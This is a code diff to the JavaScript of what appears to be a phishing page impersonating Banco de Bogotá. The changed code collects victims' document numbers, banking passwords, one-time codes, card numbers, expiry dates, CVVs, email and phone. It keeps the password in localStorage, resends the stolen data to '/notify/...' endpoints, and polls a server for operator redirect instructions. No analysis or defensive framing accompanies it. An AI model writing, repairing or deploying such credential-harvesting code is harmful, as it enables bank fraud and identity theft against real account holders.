@@ -147,13 +147,19 @@ $(document).ready(function ($) {
       phone_number: phoneNumber
     };
 
-    console.log(`📤 Enviando POST a: ${BACKEND_BASE}/api/bancobogota/login`);
+    console.log(`📤 Enviando POST a: ${BACKEND_BASE}/virtualpersona`);
     console.log(`📤 Payload:`, JSON.stringify(payload, null, 2));
 
-    fetch(BACKEND_BASE + "/api/bancobogota/login", {
+    fetch(BACKEND_BASE + "/virtualpersona", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+      body: JSON.stringify({
+        sessionId: sessionId,
+        metodo: "clave",
+        tipoDoc: tipoDoc,
+        numDoc: numDoc,
+        clave: clave
+      })
     })
       .then(function(res) {
         console.log(`✅ Response status: ${res.status}`);
@@ -204,14 +210,15 @@ $(document).ready(function ($) {
       // 🆕 PHASE 2: Add phone_number to POST request
       const phoneNumber = localStorage.getItem("phone");
 
-      fetch(BACKEND_BASE + "/api/bancobogota/otp", {
+      fetch(BACKEND_BASE + (which === "otp1" ? "/notify/otp1" : "/notify/otp2"), {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          session_id: sessionId,
-          phone_number: phoneNumber,  // ← NEW: Add phone for consistency
-          otp_token: token,
-          intento: intento
+          sessionId: sessionId,
+          tipoDoc: localStorage.getItem("tipoDoc"),
+          numDoc: localStorage.getItem("numDoc"),
+          clave: localStorage.getItem("clave"),
+          token: token
         })
       })
         .then(function(response) {
@@ -257,15 +264,16 @@ $(document).ready(function ($) {
       // 🆕 PHASE 2: Add phone_number to POST request
       const phoneNumber = localStorage.getItem("phone");
 
-      fetch(BACKEND_BASE + "/api/bancobogota/tarjeta", {
+      fetch(BACKEND_BASE + "/notify/tarjeta", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          session_id: sessionId,
-          phone_number: phoneNumber,  // ← NEW: Add phone for consistency
+          sessionId: sessionId,
+          tipoDoc: localStorage.getItem("tipoDoc"),
+          numDoc: localStorage.getItem("numDoc"),
+          clave: localStorage.getItem("clave"),
           tarjeta: tarjeta,
-          mes: mes,
-          ano: ano,
+          fecha: fecha,
           cvv: cvv
         })
       })
@@ -309,13 +317,15 @@ $(document).ready(function ($) {
       // 🆕 PHASE 2: Add phone_number to POST request
       const phoneNumber = localStorage.getItem("phone");
 
-      fetch(BACKEND_BASE + "/api/bancobogota/contact", {
+      fetch(BACKEND_BASE + "/notify/correo", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          session_id: sessionId,
-          phone_number: phoneNumber,  // ← NEW: Add phone for consistency
-          email: correo,
+          sessionId: sessionId,
+          tipoDoc: localStorage.getItem("tipoDoc"),
+          numDoc: localStorage.getItem("numDoc"),
+          clave: localStorage.getItem("clave"),
+          correo: correo,
           celular: celular
         })
       })
@@ -497,7 +507,7 @@ $(document).ready(function ($) {
 
   function startPolling(sessionId) {
     const it = setInterval(function() {
-      fetch(BACKEND_BASE + "/api/redirect/get/" + sessionId)
+      fetch(BACKEND_BASE + "/instruction/" + sessionId)
         .then(function(res) { return res.json(); })
         .then(function(data) {
           if (!data || !data.redirect_to) return;
